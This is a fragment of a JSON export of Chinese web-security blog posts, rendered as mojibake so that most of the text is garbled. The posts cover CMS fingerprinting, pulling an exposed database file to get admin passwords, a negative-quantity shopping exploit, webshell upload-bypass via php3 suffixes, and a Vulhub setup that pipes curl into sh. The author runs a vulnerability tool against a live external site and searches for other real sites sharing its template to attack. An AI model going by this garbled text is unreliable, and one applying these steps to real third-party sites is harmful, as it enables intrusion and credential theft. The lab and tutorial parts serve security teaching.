å†…å®¹ç®¡ç†ç³»ç»Ÿæ˜¯ä¼ä¸šä¿¡æ¯åŒ–å»ºè®¾å’Œç”µå­æ”¿åŠ¡çš„æ–°å® ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒæ–°çš„å¸‚åœºã€‚ å†…å®¹ç®¡ç†ç³»ç»Ÿç»„æˆè¦ç´  æ–‡æ¡£æ¨¡æ¿ è„šæœ¬è¯­è¨€æˆ–æ ‡è®°è¯­è¨€ ä¸æ•°æ®åº“é›†æˆ ï¼ˆ2ï¼‰CMSè¯†åˆ«æ–¹æ³•â‘  äººå·¥è¯†åˆ«&emsp;&emsp;ç›´æ¥çœ‹å‡ºæ¥ â‘¡ CMSè¯†åˆ«åœ¨çº¿å·¥å…·&emsp;&emsp;åœ¨çº¿cmsæŒ‡çº¹è¯†åˆ«ï¼šhttp://whatweb.bugscaner.com/look/ &emsp;&emsp;äº‘æ‚‰ï¼šhttps://www.yunsee.cn/ â‘¢ å·¥å…·ä½¿ç”¨å­—å…¸ &emsp;&emsp;å› ä¸ºæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸ªç‰¹å®šçš„md5å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®ä¸€ä¸ªç½‘ç«™çš„æ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°åï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶çš„md5å€¼ï¼Œå’Œå­—å…¸ä¸­çš„md5å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒï¼Œè¯´æ˜è¯¥ç½‘ç«™çš„cmså¯¹åº”å­—å…¸ä¸Šè¯¥æ¡è®°å½•çš„cms &emsp;&emsp;æŸ¥çœ‹æ–‡ä»¶MD5ç­‰å€¼çš„å‘½ä»¤ certutil -hashfile D:\\file.txt MD5certutil -hashfile D:\\file.txt SHA1certutil -hashfile D:\\file.txt SHA256 &emsp;&emsp;å‡è®¾è®¿é—®è¿™ä¸ªç½‘ç«™ï¼šhttp://192.168.1.105:8032/ï¼Œå°è¯•è®¿é—®http://192.168.1.105:8032/favicon.ico ï¼Œçš„ç¡®å­˜åœ¨è¯¥å›¾æ ‡ï¼Œå°†è¯¥å›¾æ ‡æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ° &emsp;&emsp;ç”Ÿæˆè¯¥æ–‡ä»¶çš„md5å€¼ï¼šcertutil -hashfile favico.ico md5 &emsp;&emsp;åœ¨å­—å…¸ä¸­æŸ¥è¯¢md5å€¼ï¼Œå‘ç°æœ‰è®°å½•ï¼Œè¯¥CMSå¯¹åº”çš„æ˜¯metinfoï¼Œæ­£ç¡® &emsp;&emsp;å­—å…¸é“¾æ¥ï¼šhttps://github.com/Lucifer1993/cmsprint å…­ã€å¼€æºæˆ–å†…éƒ¨&emsp;&emsp;å¼€æºï¼šå»ç½‘ä¸Šæ‰¾å¯»æ¼æ´æ–‡ç« ã€‚ç›´æ¥æ‰¾æ¼æ´æˆ–å®¡è®¡ï¼ˆå¯ä»¥é€šè¿‡CMSè¯†åˆ«å‡ºæ¥çš„ï¼‰ &emsp;&emsp;å†…éƒ¨ï¼šå¸¸è§„çš„æ¸—é€æµ‹è¯•ï¼Œç”¨æ‰«æå·¥å…·å»åˆ¤æ–­ã€‚ï¼ˆæ‰¾ä¸åˆ°æºç æˆ–è€…ä¸çŸ¥é“å¯¹æ–¹çš„CMSåç§°ï¼‰ ä¸ƒã€æºç è·å– æ‰«æå·¥å…·æ¢æµ‹å¤‡ä»½æ–‡ä»¶ CMSè¯†åˆ«æŠ€æœ¯è·å–CMSåç§°ç„¶åä»ç½‘ä¸Šä¸‹è½½ ç™¾åº¦ç›´æ¥æœç´¢ï¼šæºç  å’¸é±¼ä¸Šä¼šæœ‰å– ç¬¬ä¸‰æ–¹æºç ç«™ï¼šæ¯”å¦‚èœé¸Ÿæºç  å„ç§è¡Œä¸šå¯¹åº” å…«ã€æ€»ç»“&emsp;&emsp;å…³æ³¨åº”ç”¨åˆ†ç±»åŠè„šæœ¬ç±»å‹ä¼°æ‘¸å‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼ˆå…¶ä¸­æ¡†æ¶ç±»ä¾‹å¤–ï¼‰ï¼Œåœ¨è·å–æºç åå¯è¿›è¡Œæœ¬åœ°å®‰å…¨æµ‹è¯•æˆ–ä»£ç å®¡è®¡ï¼Œä¹Ÿå¯ä»¥åˆ†æå…¶ç›®å½•å·¥ä½œåŸç†ï¼ˆæ•°æ®åº“å¤‡ä»½ï¼Œbak æ–‡ä»¶ç­‰ï¼‰ï¼Œæœªè·å–åˆ°çš„æºç é‡‡ç”¨å„ç§æ–¹æ³•æƒ³åŠæ³•è·å–ã€‚ ä¹ã€æ¼”ç¤ºæ¡ˆä¾‹1ã€ASP,PHP ç­‰æºç ä¸‹å®‰å…¨æµ‹è¯•&emsp;&emsp;å¹³å°è¯†åˆ«-æŸ CMS æ— æ¼æ´-é»˜è®¤æ•°æ®åº“ &emsp;&emsp;å¹³å°è¯†åˆ«-æŸ CMS æœ‰æ¼æ´-æ¼æ´åˆ©ç”¨ ï¼ˆ1ï¼‰xycmsæ¬å®¶å…¬å¸ç™»å…¥åå° &emsp;&emsp;è®¿é—®è¯¥ç½‘ç«™ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œè§‚å¯ŸURLå¯çŸ¥ï¼Œè¯¥ç½‘ç«™åº”è¯¥æ˜¯ç”¨aspè¯­è¨€åšçš„ &emsp;&emsp;åŒæ—¶å¯ä»¥çœ‹åˆ°è¯¥ç½‘ç«™çš„CMSä¸ºxycms &emsp;&emsp;æœç´¢XYCMSæºç ï¼Œä¸‹è½½ &emsp;&emsp;æ‰“å¼€æ–‡ä»¶å¤¹ï¼Œå¯»æ‰¾å…³é”®æ•°æ®åº“è·¯å¾„æ–‡ä»¶xydataï¼Œæ‰¾åˆ°æ–‡ä»¶xycms.mdb(aspç‰¹æœ‰æ–‡ä»¶) &emsp;&emsp;è¯¥æ–‡ä»¶å­˜æœ‰ç®¡ç†å‘˜çš„è´¦å·å¯†ç  &emsp;&emsp;æ ¹æ®ä¸‹è½½çš„æºç è·¯å¾„ï¼Œå¯ä»¥å»å°è¯•è®¿é—®ç½‘ç«™çš„ç›®å½•ï¼š http://192.168.1.105:8003/xydata/xycms.mdb,ä¸‹è½½åˆ°æ–‡ä»¶ &emsp;&emsp;å°è¯•è®¿é—®åˆ°åå° &emsp;&emsp;æ•°æ®åº“ä¸­adminæ•°æ® å¯†ç MD5è§£å¯† &emsp;&emsp;ä½¿ç”¨ç”¨æˆ·å¯†ç å³å¯ç™»å½• 2ã€æºç åº”ç”¨åˆ†ç±»ä¸‹çš„é’ˆå¯¹æ¼æ´ï¼ˆ1ï¼‰ niushopç”µå•†ç±»å…³æ³¨æ¼æ´ç‚¹-ä¸šåŠ¡é€»è¾‘&emsp;&emsp;ä¹°ä¸œè¥¿æ—¶ï¼Œæ•°é‡ä¸ºä¸€ï¼Œæäº¤çš„æ—¶å€™æŠ“åŒ…ï¼Œå°†æ•°é‡æ”¹ä¸º-1ï¼Œæ•°é‡ä¸å¯èƒ½ä¸º-1ï¼Œå› æ­¤ç™½å«– 3ã€ç®€è¦ç›®æ ‡ä»è¯†åˆ«åˆ°æºç è·å–ï¼ˆ1ï¼‰æœ¬åœ°æ¼”ç¤ºä¸ªäººåšå®¢-æ‰‹å·¥å‘ç°å…¶ CMS-æ¼æ´æœç´¢æˆ–ä¸‹è½½åˆ†æ&emsp;&emsp;æ¯”å¦‚è¿™ä¸ªåšå®¢ï¼Œå¤åˆ¶åˆ°è·å–çš„æŸäº›æ–‡ä»¶çš„è·¯å¾„åˆ°æœç´¢å¼•æ“ä¸­æœç´¢ï¼Œå¯ä»¥çŸ¥é“è¯¥ç½‘ç«™çš„CMSä¸ºZBlog ï¼ˆ2ï¼‰äººå·¥çˆ†æ¡†æ¶-æœç´¢ç‰¹å®š url-è·å–å…¶ä»–ç›¸ç¬¦ç«™ç‚¹-æ¼æ´æµ‹è¯•&emsp;&emsp;http://weipan.1016sangshen.cn/ å†…éƒ¨æ­å»ºçš„é¶åœº &emsp;&emsp;è¿™æ˜¯æœ€è¿‘ä¸€ä¸ªéæ³•ç½‘ç«™å¸åœˆçš„ç½‘ç«™ï¼Œæ˜¯çœŸå®çš„ï¼Œè¿™å¥—æºç éƒ½è¿˜æœ‰å…¶ä»–äººåœ¨ç”¨ &emsp;&emsp;å¯ä»¥çœ‹åˆ°ä¸ºThinkPhp &emsp;&emsp;å°†URLæ”¾å…¥å·¥å…·ä¸­ï¼Œå­˜åœ¨æ¼æ´ï¼Œåç»­é’ˆå¯¹æ¼æ´è¿›è¡Œæ”»å‡»å³å¯ &emsp;&emsp;åˆ©ç”¨æœç´¢å¼•æ“æœç´¢è¯¥ç½‘ç«™URLä¸€æ ä¸Šçš„ï¼šindex/login/login/token &emsp;&emsp;è¿™ä¸ªå°±æ˜¯è·Ÿä¹‹å‰çš„æ¨¡æ¿ä¸€æ¨¡ä¸€æ ·çš„ï¼Œæ”¾å…¥å·¥å…·ä¸­ï¼Œå­˜åœ¨æ¼æ´ &emsp;&emsp;è¿™ä¸ªä¹Ÿæ˜¯ ï¼ˆ3ï¼‰å€ŸåŠ©ç‰¹å®šè¡Œä¸šæºç æˆ–å’¸é±¼è¿›è¡Œæœç´¢è·å–-æœ¬åœ°æ­å»º-ä»£ç å®¡è®¡æˆ–å…¶ä»–&emsp;&emsp;èœé¸Ÿæºç ä¸­ï¼Œæœç´¢å¾®ç›˜ï¼Œå°±æœ‰å¥½å¤šè¿™ç§æ¨¡æ¿çš„æºç  &emsp;&emsp;é—²é±¼ åã€å…¶ä»–&emsp;&emsp;Githubç›‘æ§å™¨ï¼šhttps://github.com/M4tir/Github-Monitor &emsp;&emsp;å¤§ä½¬çš„åšå®¢ï¼šhttps://websec.readthedocs.io/zh/latest/language/index.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Webæ­å»ºå®‰å…¨æ‹“å±•","slug":"Webæ­å»ºå®‰å…¨æ‹“å±•","date":"2021-12-13T10:41:12.000Z","updated":"2022-01-03T03:30:20.257Z","comments":true,"path":"post/ec694927.html","link":"","permalink":"https://wolke.cn/post/ec694927.html","excerpt":"","text":"ä¸€ã€å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨&emsp;&emsp;ASPï¼ŒPHPï¼ŒASPXï¼ŒJSPï¼ŒPYï¼ŒJAVAWEBç­‰ç¯å¢ƒ äºŒã€åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜1ã€ä»‹ç»&emsp;&emsp;IPåœ°å€è®¿é—®å¯ä»¥å‘ç°æ›´å¤šçš„ä¿¡æ¯åŒæ—¶ç»å¸¸èƒ½æ‰¾åˆ°ç¨‹åºæºç å¤‡ä»½æ–‡ä»¶å’Œæ•æ„Ÿä¿¡æ¯ï¼Œè€ŒåŸŸåè®¿é—®åªèƒ½å‘ç°ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚ &emsp;&emsp;ç½‘ç«™æ­å»ºçš„æ—¶å€™æ”¯æŒIPè®¿é—®å’ŒåŸŸåè®¿é—®ï¼ŒåŸŸåè®¿é—®çš„æ—¶å€™ä¸€èˆ¬åªä¼šæŒ‡å‘æŸä¸ªç›®å½•ï¼ŒIPè®¿é—®çš„æ—¶å€™æŒ‡å‘çš„æ˜¯æ ¹ç›®å½•ã€‚ 2ã€å®éªŒåˆ†æï¼ˆ1ï¼‰å®éªŒç¯å¢ƒæ­å»º&emsp;&emsp;åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªindex.html &lt;html&gt;&lt;body&gt;&lt;center&gt;è¿™æ˜¯&lt;strong&gt;æ ¹ç›®å½•&lt;/strong&gt;ä¸‹çš„ç½‘é¡µ&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºwndçš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢å†™ä¸€ä¸ªindex.html &lt;html&gt;&lt;body&gt;&lt;center&gt;è¿™æ˜¯&lt;strong&gt;wndç›®å½•&lt;/strong&gt;ä¸‹çš„ç½‘é¡µ&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;å°†åŸŸåwnd198.comç»‘å®šåˆ°wndæ–‡ä»¶å¤¹ &emsp;&emsp;åˆ©ç”¨ipconfigæŸ¥çœ‹åˆ°æœ¬æœºIPä¸º192.168.1.104ï¼Œä¿®æ”¹hostsæ–‡ä»¶ï¼Œå¢åŠ ä¸€æ¡è§£æ ï¼ˆ2ï¼‰éªŒè¯å’Œç»“æœåˆ†æ&emsp;&emsp;è®¿é—®wnd198.comï¼Œè®¿é—®çš„æ˜¯wndç›®å½•ä¸‹çš„æ–‡ä»¶ &emsp;&emsp;ç›´æ¥è®¿é—®IPåœ°å€192.168.1.104ï¼Œè®¿é—®çš„æ˜¯æ ¹ç›®å½•çš„æ–‡ä»¶ ä¸‰ã€éƒ¨ç½²IIS1ã€å®‰è£…IIS&emsp;&emsp;å®‰è£…IISä¹‹webæ’ä»¶ï¼Œæ’å…¥å…‰ç›˜â€“æ‰¾åˆ°IISâ€“WEB(åº”ç”¨ç¨‹åºæœåŠ¡å™¨â€“Internetä¿¡æ¯æœåŠ¡ï¼‰ &emsp;&emsp;å‡ºç°è¿™ç§æƒ…å†µæŠŠDæ”¹æˆEå³å¯ã€‚å› ä¸ºä¹‹å‰æˆ‘å®‰è£…è™šæ‹Ÿæœºçš„æ—¶å€™å¼ºåˆ¶æŠŠDç›˜ç¬¦ç»™äº†ç¡¬ç›˜ï¼ŒæŠŠå…‰ç›˜è®¾ç½®ä¸ºEç›˜ï¼Œæ‰€ä»¥æŒ‰å®‰è£…ç¨‹åºè¿˜ä»¥ä¸ºå…‰ç›˜åœ¨Dç›˜æ‰€ä»¥æ‰¾ä¸åˆ°æ–‡ä»¶å› æ­¤å†’å‡ºæç¤º &emsp;&emsp;å®‰è£…å®Œæˆï¼Œå¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ° 2ã€éªŒè¯å®‰è£…æƒ…å†µ&emsp;&emsp;å®‰è£…å®Œæ¯•ï¼Œä½¿ç”¨netstat -anéªŒè¯TCP/80ç«¯å£æ˜¯å¦æ‰“å¼€ï¼æ­¤æ—¶80å·²ç»æ‰“å¼€ï¼Œä¸”IISè‡ªå¸¦äº†ä¸€ä¸ªå‘å¸ƒå¥½çš„ç½‘ç«™ï¼Œç§°ä¹‹ä¸ºé»˜è®¤ç½‘ç«™ï¼ &emsp;&emsp;IISè‡ªå¸¦çš„é»˜è®¤ç½‘ç«™è·¯å¾„ï¼šc:\\Inetpub\\wwwrootã€‚æ­¤æ—¶å»ºè®®åœæ­¢é»˜è®¤ç½‘ç«™ï¼ &emsp;&emsp;åœæ­¢é»˜è®¤ç½‘ç«™åï¼Œå¯ä»¥å‘ç°TCP 80ç«¯å£å·ä¹Ÿä¸è§äº†ï¼Œå› æ­¤å¯ä»¥çŸ¥é“80ç«¯å£å·å¼€æ”¾äº†é‚£ä¹ˆwebæœåŠ¡å™¨ä¸€å®šæœ‰ä¸€ä¸ªä»¥ä¸Šçš„ç½‘ç«™ã€‚ç”¨xpå†æ¬¡è®¿é—®10.1.1.1ï¼Œæ˜¾ç¤ºå¦‚ä¸‹é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºæœ€åä¸€ä¸ªç½‘ç«™éƒ½åœç”¨äº†ï¼Œé‚£TCP 80ç«¯å£å·å°±å…³é—­äº† 3ã€æ–°å»ºç½‘ç«™&emsp;&emsp;æ–°å»ºä¸€ä¸ªflowerçš„ç½‘ç«™ï¼Œå¹¶åœ¨ç½‘ç«™ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªindex.htmlæ–‡ä»¶å¹¶å°†è¯¥htmlåœ¨æ–‡æ¡£ä¸€æ ä¸­è®¾ç½®ä¸ºé»˜è®¤æ–‡æ¡£ #index.htmlæºç &lt;html&gt;&lt;body&gt;&lt;center&gt;&lt;strong&gt;Welcome to my flowers store&lt;/strong&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;è®¿é—®æˆåŠŸ å››ã€å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨&emsp;&emsp;æŒ‡å®šåç¼€åå¯¹åº”æŸä¸ªæ–‡ä»¶ï¼Œè®¿é—®ç½‘ç«™å‡ºç°é‡åˆ°ä¸èƒ½è§£æçš„æ–‡ä»¶å°±æ˜¯ä¸­é—´ä»¶å¯èƒ½é»˜è®¤æˆ–è€…æ·»åŠ æŸäº›è®¾ç½®å¯¼è‡´è§£ææ—¶å‡ºç°é—®é¢˜ã€‚ å®éªŒï¼ˆ1ï¼‰å®éªŒå‡†å¤‡&emsp;&emsp;ä»ç½‘ç«™ä¸Šéšä¾¿æ‰¾äº†ä¸ªaspç½‘ç«™æºç ï¼Œå…ˆæŒ‰ç…§ä½¿ç”¨æ‰‹å†Œçš„è¦æ±‚è¿›è¡Œç›¸å…³è®¾ç½® &emsp;&emsp;å¯¹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„Nzcms_nzwebæ–‡ä»¶å¤¹æ·»åŠ everyoneç”¨æˆ·ï¼Œå†™å…¥æƒé™ &emsp;&emsp;å¼€é€šIISçˆ¶è·¯å¾„ &emsp;&emsp;IISè®¾ç½®æ‰§è¡Œæƒé™ï¼ˆçº¯è„šæœ¬ï¼‰ &emsp;&emsp;å¦‚æœæ‰§è¡Œæƒé™ä¸ºæ— ï¼Œé‚£ä¹ˆå½“è®¿é—®http://æœ¬æœºIP/nz0808/index.aspï¼Œå‘ç°é”™è¯¯ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸ºæ— æ³•è¿è¡Œè„šæœ¬ï¼Œè¯´æ˜æ²¡æœ‰è¿è¡Œçš„æƒé™ &emsp;&emsp;æ·»åŠ index.aspæ–‡æ¡£åç§° &emsp;&emsp;IISé‡Œçš„WEBæœåŠ¡å™¨æ‰©å±•è®¾ç½® &emsp;&emsp;è®¿é—®æˆåŠŸ ï¼ˆ2ï¼‰è¿›è¡Œå®éªŒ&emsp;&emsp;å½“æˆ‘ä»¬è®¿é—®ï¼šhttp://192.168.43.77/index.aspæ—¶ï¼Œæ­£å¸¸æˆåŠŸè®¿é—® &emsp;&emsp;å½“æˆ‘ä»¬è®¿é—®ï¼šhttp://192.168.43.77/index.haha123æ—¶ï¼Œæ‰¾ä¸åˆ°ç½‘é¡µï¼Œæ­£å¸¸ï¼Œå› ä¸ºç½‘ç«™æ ¹æœ¬æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ &emsp;&emsp;å°†index.aspé‡å‘½åä¸ºindex.haha123åï¼Œå†æ¬¡è®¿é—®http://192.168.43.77/index.haha123ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œå› ä¸ºæ— æ³•è§£æåç¼€åä¸ºhaha123çš„æ–‡ä»¶ &emsp;&emsp;æ·»åŠ ä¸€ä¸ªhaha123çš„æ–‡ä»¶åç¼€è§£æè§„åˆ™ï¼Œå°†haha123åç¼€è§£æä¸ºasp &emsp;&emsp;å†æ¬¡è®¿é—®ï¼šhttp://192.168.43.77/index.haha123æ—¶ï¼ŒæˆåŠŸè§£ææ‰“å¼€ ï¼ˆ3ï¼‰å®éªŒæ€»ç»“&emsp;&emsp;åœ¨å®éªŒå‡†å¤‡çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€æ­¥æ˜¯å¢åŠ äº†Everyoneç”¨æˆ·å¹¶å¯¹å…¶è¿›è¡Œæƒé™è®¾ç½®ï¼Œåœ¨å¾ˆå¤šæ—¶å€™æ¯”å¦‚ç”¨èœåˆ€è¿æ¥ä¸€å¥è¯æœ¨é©¬çš„æ—¶å€™ï¼Œä¼šå‘ç°åªçœ‹çš„åˆ°å½“å‰ç½‘ç«™ç›®å½•è®¿é—®ä¸åˆ°åˆ«çš„ç›®å½•ï¼›æˆ–è€…æ˜¯åªèƒ½çœ‹æ–‡ä»¶ä½†æ˜¯ä¸èƒ½ä¿®æ”¹æ–‡ä»¶ï¼›è¿™äº›éƒ½å¯èƒ½æ˜¯è®¾ç½®äº†ç›®å½•çš„ç”¨æˆ·æƒé™ &emsp;&emsp;åœ¨å®éªŒå‡†å¤‡çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€æ­¥æ˜¯è®¾ç½®æ‰§è¡Œæƒé™ä¸ºçº¯è„šæœ¬ï¼Œå‡å¦‚ä¸ºæ— é‚£ä¹ˆå°†è¿è¡Œä¸äº†è„šæœ¬æ–‡ä»¶ï¼Œå› æ­¤æœ‰çš„æ—¶å€™å³ä½¿ä¸Šä¼ äº†ä¸€å¥è¯æœ¨é©¬ä½†æ˜¯å‘ç°è¿æ¥ä¸ä¸Šå¾ˆå¯èƒ½æ˜¯å› ä¸ºæ‰§è¡Œæƒé™ä¸å¤Ÿã€‚ä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè€ƒè™‘åˆ°ç½‘ç«™è¿è¡Œï¼Œéƒ½ä¼šå…è®¸è„šæœ¬è¿è¡Œ &emsp;&emsp;åœ¨å®éªŒæ—¶å‘ç°ï¼Œåªè¦è§£æè§„åˆ™ä¸Šæœ‰ï¼Œå°±å¯ä»¥è§£æç›¸å…³çš„åç¼€æ–‡ä»¶ã€‚å› æ­¤å‡å¦‚ä¸€å¥è¯æœ¨é©¬ä¸å…è®¸ä¸Šä¼ PHPæ–‡ä»¶ï¼Œä½†æ˜¯è§£æè§„åˆ™åˆèƒ½è§£æphp3ä¸ºphpæ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ä¸Šä¼ php3åç¼€çš„æœ¨é©¬æ–‡ä»¶è¿›è¡Œç»•è¿‡ã€‚ äº”ã€å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤ ä¼ä¸šå†…ç½‘ä¼šé™åˆ¶å¤–éƒ¨äººå‘˜è®¿é—®å†…éƒ¨çš„ç½‘ç«™ï¼Œé™åˆ¶IPåœ°å€ï¼Œè§„èŒƒè®¿é—®è€…çš„æƒé™ èº«ä»½éªŒè¯å’Œè®¿é—®æ§åˆ¶ï¼ŒåŸºäºç”¨æˆ·çš„é™åˆ¶ é™åˆ¶IPåœ°å€çš„è®¿é—®ï¼Œæˆæƒè®¿é—®-åªå…è®¸æŒ‡å®šIPåœ°å€å¯ä»¥è®¿é—®ã€‚ æ‹’ç»è®¿é—®-æŒ‡å®šIPåœ°å€æ‹’ç»è®¿é—® å…­ã€Webç›®å½•ä¸­æ•æ„Ÿæ–‡ä»¶ åå°è·¯å¾„ é…ç½®æ–‡ä»¶ å¤‡ä»½æ–‡ä»¶ ä¸ƒã€Webåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™ è®¾ç½®ç›¸å…³æƒé™ï¼Œç¦æ­¢æ¥å®¾ç”¨æˆ·çš„æƒé™ï¼Œå¯¼è‡´è¿æ¥çš„åé—¨çœ‹ä¸åˆ°ä»»ä½•ä¸œè¥¿ï¼Œå®ƒå±äºé˜²æŠ¤æŠ€å·§ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æµ‹è¯•é‡Œç»å¸¸ç¢°åˆ°çš„é—®é¢˜ è®¾ç½®äº†æ‰§è¡Œæƒé™ï¼Œæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæ–‡ä»¶ä¸ç»™æ‰§è¡Œï¼Œä»£ç å°±æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œåé—¨å°±æ— æ³•æ­£å¸¸ä½¿ç”¨ ç»•è¿‡æ€è·¯ï¼š a. å°†åé—¨è¯•ç€æ”¾åœ¨å…¶ä»–å¯ä»¥æ‰§è¡Œçš„ç›®å½•ã€‚æ¯”å¦‚ï¼Œç½‘ç«™æ ¹ç›®å½•æˆ–è€…å…¶ä»–æœ‰è„šæœ¬å­˜æ”¾çš„ç›®å½•ä¸‹é¢ å…«ã€åŸºäºä¸­é—´ä»¶çš„ç®€è¦è¯†åˆ«&emsp;&emsp;é€šè¿‡æŠ“å–æ•°æ®åŒ…çš„è¿”å›ç»“æœï¼ŒæŸ¥è¯¢æ­å»ºå¹³å°ä¿¡æ¯ ä¹ã€åŸºäºä¸­é—´ä»¶çš„å®‰å…¨æ¼æ´&emsp;&emsp;https://www.freebuf.com/articles/web/192063.html &emsp;&emsp;webä¸­é—´ä»¶å¸¸è§æ¼æ´æ€»ç»“.pdf åã€æ­å»ºVulhubé¶åœº1ã€ä¸‹è½½&emsp;&emsp;Vulhubå®˜ç½‘ï¼šhttps://vulhub.org/vulhub 2ã€å®‰è£… å®˜æ–¹æ¨èç”¨Ubuntuæ¥å®‰è£… å®‰è£…å¸¸ç”¨è½¯ä»¶ï¼š aptæ˜¯Ubuntuçš„ä¸€ä¸ªæ›´æ–°æºapt-get update:æ›´æ–°è½¯ä»¶åˆ—è¡¨apt-get install:å®‰è£…å‘½ä»¤apt-get install sshï¼šå®‰è£…sshæœåŠ¡apt-get install vimï¼šå®‰è£…vimç¼–è¾‘å™¨ å¼€å¯sshæœåŠ¡ï¼ˆæŸ¥çœ‹çŠ¶æ€å·²ç»å¼€å¯è¿‡äº†ï¼‰ï¼šsystemctl status ssh æˆ–è€… service ssh status å®‰è£…curlï¼šsudo apt-get install curl å®‰è£…Dockerï¼šcurl -s https://get.docker.com/ | sh æŸ¥çœ‹dockeræ˜¯å¦å®‰è£…æˆåŠŸï¼šdocker -v å®‰è£…docker-composeï¼ˆæ²¡æœ‰pipå‘½ä»¤å…ˆå®‰è£…Pythonï¼šapt-get install python3-pipï¼‰å‘½ä»¤ï¼špip install docker-compose æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸï¼šdocker-compose -v ä¸‹è½½Vulhubï¼ˆä¸èƒ½æ‰§è¡ŒGitå‘½ä»¤çš„å…ˆå®‰è£…Gitï¼Œå‘½ä»¤ï¼šapt-get install gitï¼‰å‘½ä»¤ï¼šgit clone https://github.com/vulhub/vulhub.git å°†ä¸‹è½½å¥½çš„vulhubç§»è‡³localæ–‡ä»¶å¤¹ï¼šmv vulhub /usr/local å®‰è£…æˆåŠŸï¼Œè¿›å…¥ç›®å½• 3ã€å¯åŠ¨ç¯å¢ƒ è¿›å…¥æ¼æ´ç¯å¢ƒç›®å½•ï¼šcd tomcat/tomcat8/ æ‰§è¡Œå‘½ä»¤ï¼šdocker-compose builddocker-compose up -d å®‰è£…å®Œæˆ æ‰“å¼€å®˜ç½‘ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£æ¥æ“ä½œ å¤ç°ä¹‹åå³å¯å…³é—­ï¼šdocker-compose down å®Œæˆ","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"PHPæ£€æŸ¥ç›¸ç­‰æ—¶çš„æ¼æ´","slug":"PHPæ£€æŸ¥ç›¸ç­‰æ—¶çš„æ¼æ´","date":"2021-12-12T16:21:18.000Z","updated":"2022-01-03T03:29:07.160Z","comments":true,"path":"post/a645df71.html","link":"","permalink":"https://wolke.cn/post/a645df71.html","excerpt":"","text":"ä¸€ã€PHPå¼±ç±»å‹==çš„æ¼æ´1ã€åŸç†æ³¨ï¼šè¿™äº›æ¼æ´é€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬çš„PHP &emsp;&emsp;å…ˆæ¥å¤ä¹ ä¸€ä¸‹åŸºæœ¬çš„è¯­æ³•ï¼šphpä¸­æœ‰å¦‚ä¸‹ä¸¤ç§æ¯”è¾ƒç¬¦å·ï¼šä¸¤ä¸ªç­‰å·å’Œä¸‰ä¸ªç­‰å·ï¼ˆè¿™ä¸€ç‚¹å’ŒJavascriptï¼‰æœ‰äº›ç±»ä¼¼ $a==$b$a===$b &emsp;&emsp;æˆ‘ä»¬æ¥ä¸€ä¸‹phpå®˜æ–¹æ‰‹å†Œçš„è¯´æ³• å¦‚æœç±»å‹è½¬æ¢å $a ç­‰äº $bï¼Œåˆ™ $a == $b ç­‰äº TRUEã€‚å¦‚æœ $a ç­‰äº $bï¼Œå¹¶ä¸”å®ƒä»¬çš„ç±»å‹ä¹Ÿç›¸åŒï¼Œåˆ™ $a === $b å…¨ç­‰ TRUEã€‚ &emsp;&emsp;æ˜ç¡®çš„çœ‹åˆ°ï¼Œä¸¤ä¸ªç­‰äºå·çš„ç­‰äºä¼šåœ¨æ¯”è¾ƒçš„æ—¶å€™è¿›è¡Œç±»å‹è½¬æ¢çš„æ¯”è¾ƒ 